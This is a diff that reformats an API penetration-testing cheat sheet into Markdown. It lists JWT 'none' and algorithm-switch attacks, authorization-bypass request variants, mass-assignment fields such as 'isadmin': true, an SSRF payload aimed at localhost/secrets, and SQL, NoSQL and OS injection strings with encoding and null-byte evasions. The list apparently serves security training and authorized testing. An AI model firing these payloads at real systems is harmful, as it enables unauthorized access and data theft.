@@ -1,117 +1,139 @@
-JWT Attacks:
+# API
+
+## JWT Attacks:
+```
 echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9|base64 -d
 date --date=@'{timestamp}'
+```
 
-The None Attack
-eyJhbGciOiJub25lIn0
+### The None Attack
+`eyJhbGciOiJub25lIn0`
 
-The Algorithm Switch Attack --> RS256 to HS256
+### The Algorithm Switch Attack
+RS256 to HS256
 
-JWT Crack Attack
-
+### JWT Tools
 JWT_Tool
 
-
-Broken Object Level Authorization:
+## Broken Object Level Authorization:
 A-B testing
 
+### Example:
 Valid Request:
-{"Account" : 2222}
+
+`{"Account" : 2222}`
+
 Try:
+```
 {"Account" : [3333]}
 {"Account" : {"Account" : 3333}}
 {"Account" : 2222, "Account" : 3333, "Account" : 5555}
+```
 
-Broken Function Level Authorization:
+## Broken Function Level Authorization:
 A-B-A testing
 
-
-Improper Assets Management:
-
+## Improper Assets Management:
+```
 api.target.com/v3
 /api/v2/accounts
 /api/v3/accounts
 /v2/accounts
+```
 
+```
 Accept: version=2.0
 Accept api-version=3
+```
 
-/api/accounts?ver=2
+`/api/accounts?ver=2`
 
+```
 POST /api/accounts
 {
 "ver":1.0,
 "user":"hapihacker"
 }
+```
 
-Non-production versions
+### Non-production versions
+```
 api.test.target.com
 api.uat.target.com
 beta.api.com
 /api/private
 /api/partner
 /api/test
+```
 
-
-Mass Assignment:
-
+## Mass Assignment:
 Overwrite object properties that they should not be able to
 
+```
 "isadmin": true,
 "isadmin":"true",
 "admin": 1,
-"admin": true, 
+"admin": true,
+```
 
 Burp --> Param Miner
 
-
-Server-Side Request Forgery:
-
+## Server-Side Request Forgery:
 Application retrieves remote resources without validating user input
 
-In-Band SSRF and Blind SSRF
+### In-Band SSRF and Blind SSRF
 In Band SSRF, means that the server responds with the resources specified by the end user
+
 Blind SSRF takes place when the attacker supplies a URL and the server makes the request but does not send information from the specified URL back to the attacker
 
 Include full URLs in the POST body or parameters
+
 Include URL paths (or partial URLs) in the POST body or parameters
+
 Headers that include URLs like Referer
+
 Allows for user input that may result in a server retrieving resources
 
-Burp Collaborator
-Your own web server
+Burp Collaborator or Your own web server
 
 Intercepted Request:
+
+```
 POST api/v1/store/products
 headers…
 {
 "inventory":"http://store.com/api/v3/inventory/item/12345"
 }
+```
 
 Attack:
+
+```
 POST api/v1/store/products
 headers…
 {
 "inventory":"§http://localhost/secrets§"
 }
+```
 
+## Injection:
+Send:
+- A very large number
+- A very large string
+- A negative number
+- A string (instead of a number or Boolean value)
+- Random characters
+- Boolean values
+- Meta characters
 
-Injection:
-
-Send
-A very large number
-A very large string
-A negative number
-A string (instead of a number or Boolean value)
-Random characters
-Boolean values
-Meta characters
-
-SQL Metacharacters
+### SQL Metacharacters
 Characters that SQL treats as functions rather than data
-- is a metacharacter that tells the SQL interpreter to ignore the following input because it is a comment
+
+`-` is a metacharacter that tells the SQL interpreter to ignore the following input because it is a comment
 
 SQL metacharacters
+
+```
 '
 ''
 ;%00 --> A null byte
@@ -125,8 +147,10 @@ SQL metacharacters
 " OR 1 = 1 -- -
 ' OR '' = '
 OR 1=1
+```
 
-NoSQL metacharacters
+### NoSQL metacharacters
+```
 $gt 
 {"$gt":""}
 {"$gt":-1}
@@ -137,8 +161,10 @@ $ne
 {"$nin":1}
 {"$nin":[1]}
 {"$where":  "sleep(1000)"}
+```
 
-OS Injection
+### OS Injection
+```
 |
 ||
 &
@@ -147,8 +173,11 @@ OS Injection
 "
 ;
 '"
+```
 
 Common Operating System Commands to Use in Injection Attacks
+
+```
 ipconfig
 dir
 ver
@@ -156,16 +185,15 @@ whoami
 ifconfig
 ls
 pwd
+```
 
-Tools
-Postman Collection Runner
-Burp Intruder
-WFuzz
+### Tools
+- Postman Collection Runner
+- Burp Intruder
+- WFuzz
 
-
-Evasive Maneuvers:
-
-String Terminators
+### String Terminators
+```
 %00
 0x00
 //
@@ -180,22 +208,29 @@ String Terminators
 %0b
 %0c
 %0e
+```
 
+```
 POST /api/v1/user/profile/update
 […]
 {
 “uname”: “hapihacker”
 “pass”: "%00'OR 1=1"
 }
+```
 
-Case Switching
-Example
+## Case Switching
+```
 POST /api/myProfile 
 POST /api/MyProfile 
 POST /aPi/MypRoFiLe
+```
 
-Encoding Payloads
+## Encoding Payloads
 Double URL Encoded Payload
-' OR 1=1;
-%27%20%4f%52%20%31%3d%31%3b
-%25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
+
+`' OR 1=1;`
+
+`%27%20%4f%52%20%31%3d%31%3b`
+
+`%25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62`
